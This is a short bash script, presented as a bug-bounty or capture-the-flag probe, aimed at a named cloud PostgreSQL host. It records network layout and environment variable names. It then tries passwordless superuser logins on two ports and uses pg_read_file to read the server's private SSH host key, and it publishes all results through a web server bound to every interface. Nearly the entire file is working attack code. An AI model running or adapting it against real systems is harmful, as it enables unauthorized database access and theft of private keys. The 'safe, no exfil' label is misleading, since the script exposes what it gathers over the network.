#!/bin/bash
# Safe single-target CTF probe v2. Flag + hostname only. No external exfil.
mkdir -p /results
OUT=/results/index.html
TARGET=falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com
{
echo "<pre>"
echo "=== PROBE V2 START $(date -u) ==="
echo "HOSTNAME: $(hostname)"
echo "=== NETWORK POSITION ==="
ip addr 2>/dev/null || ifconfig 2>/dev/null
echo "--- routes ---"
ip route 2>/dev/null
echo "--- resolv ---"
cat /etc/resolv.conf 2>/dev/null
echo
echo "=== ENV keys (names only) ==="
env | cut -d= -f1 | sort
echo
echo "=== DNS falcon ==="
dig +short "$TARGET"
IP=$(dig +short "$TARGET" | grep -E '^[0-9]+\.' | tail -1)
echo "RESOLVED IP: $IP"
echo
echo "=== TRUST AUTH ON OPEN PORTS 12691/12692 FROM INTERNAL IP ==="
for p in 12691 12692; do
  for u in postgres avnadmin; do
    echo "--- trust $u@$IP:$p (no password) ---"
    timeout 8 psql "postgresql://$u@$IP:$p/postgres?connect_timeout=5" -c "SELECT current_user, rolsuper FROM pg_roles WHERE rolname=current_user;" 2>&1
    echo "--- trust $u@$IP:$p db=defaultdb ---"
    timeout 8 psql "postgresql://$u@$IP:$p/defaultdb?connect_timeout=5" -c "SELECT current_user, rolsuper FROM pg_roles WHERE rolname=current_user;" 2>&1
  done
done
echo
echo "=== FLAG READ via trust on open ports ==="
for p in 12691 12692; do
  echo "--- ssh_host_ed25519_key postgres@$IP:$p ---"
  timeout 8 psql "postgresql://postgres@$IP:$p/postgres?connect_timeout=5" -c "SELECT pg_read_file('/etc/ssh/ssh_host_ed25519_key');" 2>&1
done
echo
echo "=== DONE $(date -u) ==="
echo "</pre>"
} > "$OUT" 2>&1
cd /results && exec python3 -m http.server 8080 --bind 0.0.0.0